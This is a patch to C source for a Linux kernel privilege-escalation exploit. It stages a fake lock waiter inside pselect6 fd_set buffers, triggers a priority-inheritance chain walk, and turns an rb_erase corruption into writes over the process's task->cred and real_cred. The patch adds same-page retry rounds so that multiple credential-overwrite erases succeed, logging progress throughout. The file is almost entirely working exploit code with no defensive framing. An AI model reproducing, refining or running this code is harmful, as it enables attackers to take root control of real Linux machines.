@@ -435,8 +435,9 @@ static void readback_full_diff(void) {
  *      coordinate and the selected frame lands at the dangling waiter.
  *      Signal delivery may overwrite the old waiter bytes first; that is
  *      expected because pselect rewrites the complete field set used by the
- *      later walk. Persistence of task->pi_blocked_on through this sequence
- *      remains a dynamic precondition and is not asserted by this comment.
+ *      later walk. The exact V643 rollback and the upstream fix prove the
+ *      stale task->pi_blocked_on state statically; live signal/PI timing is
+ *      still deliberately not claimed here.
  *   5. consumer: sched_setattr(waiter_tid, nice ladder) -> the PI chain
  *      walk fires against the overlay while the handler is blocked in its
  *      carrier syscall -> the rb_erase write primitive -> task->cred/real_cred =
@@ -1097,8 +1098,9 @@ static void do_tcl_v643_pselect6_fake_lock_route(void) {
   int sv[2] = {-1, -1};
   int source_fd = -1;
   int saved_count = 0;
-  int calls = 0;
-  int success = 0;
+  int total_calls = 0;
+  int total_success = 0;
+  int route_verified = 0;
 
   if (!page_base || !fake_lock || !fake_fops) {
     cfi_last_step = 130;
@@ -1107,19 +1109,13 @@ static void do_tcl_v643_pselect6_fake_lock_route(void) {
     return;
   }
 
-  uint64_t task_val = fake_task;
-  uint64_t lock_val = fake_lock;
-  uint32_t wake_state = 3;
-  int32_t prio = env_int_range("CAL_PRIO", 1, 0, 140);
+  /* Descriptor aliases are derived from the input bitmaps.  task/lock and
+   * the selected priority are stable across retry rounds, so initialize the
+   * carrier before installing those aliases; each round rebuilds the same
+   * bitmap contents into fresh user fd_sets below. */
   tcl_v643_build_pselect_carrier(
-      &carrier, task_val, lock_val, wake_state, prio);
-
-  memset(&readfds, 0, sizeof(readfds));
-  memset(&writefds, 0, sizeof(writefds));
-  memset(&exceptfds, 0, sizeof(exceptfds));
-  memcpy(&readfds, carrier.readfds, sizeof(carrier.readfds));
-  memcpy(&writefds, carrier.writefds, sizeof(carrier.writefds));
-  memcpy(&exceptfds, carrier.exceptfds, sizeof(carrier.exceptfds));
+      &carrier, fake_task, fake_lock, 3,
+      env_int_range("CAL_PRIO", 1, 0, 140));
 
   if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
     cfi_last_step = 131;
@@ -1144,55 +1140,124 @@ static void do_tcl_v643_pselect6_fake_lock_route(void) {
     goto out;
   }
 
-  atomic_store(&consumer_calls, 0);
-  atomic_store(&consumer_success, 0);
   atomic_store(&punch_consume_stop, 0);
-  atomic_store(&main_route_delay_usec, route_delay_usec(1));
   walk_poller_start();
 
-  pr_info("TCL pselect6 carrier nfds=%u task=%016llx lock=%016llx prio=%d\n",
-          TCL_V643_PSELECT_NFDS,
-          (unsigned long long)task_val,
-          (unsigned long long)lock_val, prio);
-  atomic_store(&punch_consume_go, 1);
-  errno = 0;
-  {
-    /* Keep the kernel frame resident beyond the consumer's eight-second
-     * completion budget; a timeout must not dismantle the carrier first. */
-    struct timespec timeout = {.tv_sec = 9, .tv_nsec = 0};
-    long ret = syscall(__NR_pselect6, TCL_V643_PSELECT_NFDS,
-                       &readfds, &writefds, &exceptfds,
-                       &timeout, NULL);
-    cfi_last_errno = errno;
-    pr_info("TCL pselect6 returned ret=%ld errno=%d\n", ret, cfi_last_errno);
-  }
+  /* One pselect frame can safely host one cred-write walk: the walk clamps
+   * waiter->prio, so the next priority change needs a freshly written stack
+   * waiter. Re-enter pselect at the same coordinate for each pending plan,
+   * mirroring the reference route's same-page retry without re-running
+   * reclaim after a landed first erase. */
+  int max_rounds = write_mode_is_cred(pselect_custom_write) ?
+      ghost_plan_count() : 1;
+  if (max_rounds < 1) max_rounds = 1;
+  if (max_rounds > PSELECT_CFI_ROUTE_ATTEMPTS)
+    max_rounds = PSELECT_CFI_ROUTE_ATTEMPTS;
 
-  /* The stack carrier must not be dismantled while the synchronous PI walk
-   * is still in flight. */
-  {
-    struct timespec spin_start;
-    clock_gettime(CLOCK_MONOTONIC, &spin_start);
-    while (atomic_load(&punch_consume_go) != 0) {
-      struct timespec now;
-      clock_gettime(CLOCK_MONOTONIC, &now);
-      if (now.tv_sec - spin_start.tv_sec >= 8) break;
+  for (int round = 1; round <= max_rounds; round++) {
+    uint64_t task_val = fake_task;
+    uint64_t lock_val = fake_lock;
+    uint32_t wake_state = 3;
+    int32_t prio = env_int_range("CAL_PRIO", 1, 0, 140);
+
+    if (round > 1) {
+      int hits = atomic_load(&consumer_erase_hits);
+      if (!write_mode_is_cred(pselect_custom_write) || hits <= 0 ||
+          hits >= ghost_plan_count() || !consumer_nice_headroom())
+        break;
+      pr_info("TCL pselect6 same-page retry round=%d erases=%d/%d nice=%d\n",
+              round, hits, ghost_plan_count(), g_consumer_nice);
     }
-  }
-  usleep(50000);
-  calls = atomic_load(&consumer_calls);
-  success = atomic_load(&consumer_success);
-  cfi_last_step = calls > 0 ? 0 : 134;
 
-  readback_full_diff();
+    tcl_v643_build_pselect_carrier(
+        &carrier, task_val, lock_val, wake_state, prio);
+    memset(&readfds, 0, sizeof(readfds));
+    memset(&writefds, 0, sizeof(writefds));
+    memset(&exceptfds, 0, sizeof(exceptfds));
+    memcpy(&readfds, carrier.readfds, sizeof(carrier.readfds));
+    memcpy(&writefds, carrier.writefds, sizeof(carrier.writefds));
+    memcpy(&exceptfds, carrier.exceptfds, sizeof(carrier.exceptfds));
+
+    atomic_store(&consumer_calls, 0);
+    atomic_store(&consumer_success, 0);
+    atomic_store(&main_route_delay_usec, route_delay_usec(round));
+    pr_info("TCL pselect6 round=%d/%d nfds=%u task=%016llx lock=%016llx prio=%d\n",
+            round, max_rounds, TCL_V643_PSELECT_NFDS,
+            (unsigned long long)task_val,
+            (unsigned long long)lock_val, prio);
+    atomic_store(&punch_consume_go, round);
+    errno = 0;
+    {
+      /* Keep the frame resident beyond the consumer's eight-second budget;
+       * timeout must not dismantle it while a synchronous walk is in flight. */
+      struct timespec timeout = {.tv_sec = 9, .tv_nsec = 0};
+      long ret = syscall(__NR_pselect6, TCL_V643_PSELECT_NFDS,
+                         &readfds, &writefds, &exceptfds,
+                         &timeout, NULL);
+      cfi_last_errno = errno;
+      pr_info("TCL pselect6 round=%d returned ret=%ld errno=%d\n",
+              round, ret, cfi_last_errno);
+    }
+
+    /* The stack carrier must not be dismantled while the synchronous PI walk
+     * is still in flight. */
+    {
+      struct timespec spin_start;
+      clock_gettime(CLOCK_MONOTONIC, &spin_start);
+      while (atomic_load(&punch_consume_go) != 0) {
+        struct timespec now;
+        clock_gettime(CLOCK_MONOTONIC, &now);
+        if (now.tv_sec - spin_start.tv_sec >= 8) break;
+      }
+    }
+    usleep(50000);
+
+    int calls = atomic_load(&consumer_calls);
+    int success = atomic_load(&consumer_success);
+    total_calls += calls;
+    total_success += success;
+    readback_full_diff();
+
+    if (calls <= 0) {
+      cfi_last_step = 134;
+      break;
+    }
+
+    if (write_mode_is_cred(pselect_custom_write)) {
+      int hits = atomic_load(&consumer_erase_hits);
+      if (hits >= ghost_plan_count()) {
+        g_route_write_ok = 1;
+        route_verified = 1;
+        cfi_last_step = 0;
+        cfi_last_errno = 0;
+        break;
+      }
+      if (hits <= 0 || !consumer_nice_headroom()) {
+        cfi_last_step = 135;
+        break;
+      }
+      continue;
+    }
+
+    route_verified = 1;
+    cfi_last_step = 0;
+    cfi_last_errno = 0;
+    break;
+  }
+
   walk_poller_stop();
+
+  if (!route_verified && cfi_last_step == 0)
+    cfi_last_step = 136;
 
 out:
   if (saved_count > 0) tcl_v643_restore_carrier_fds(saved, saved_count);
   if (source_fd >= 0) close(source_fd);
   if (sv[0] >= 0) close(sv[0]);
   if (sv[1] >= 0) close(sv[1]);
-  pr_info("TCL pselect6 route done calls=%d success=%d step=%d errno=%d\n",
-          calls, success, cfi_last_step, cfi_last_errno);
+  pr_info("TCL pselect6 route done calls=%d success=%d erases=%d/%d step=%d errno=%d\n",
+          total_calls, total_success, atomic_load(&consumer_erase_hits),
+          ghost_plan_count(), cfi_last_step, cfi_last_errno);
 }
 
 void do_pselect_fake_lock_route(void) {
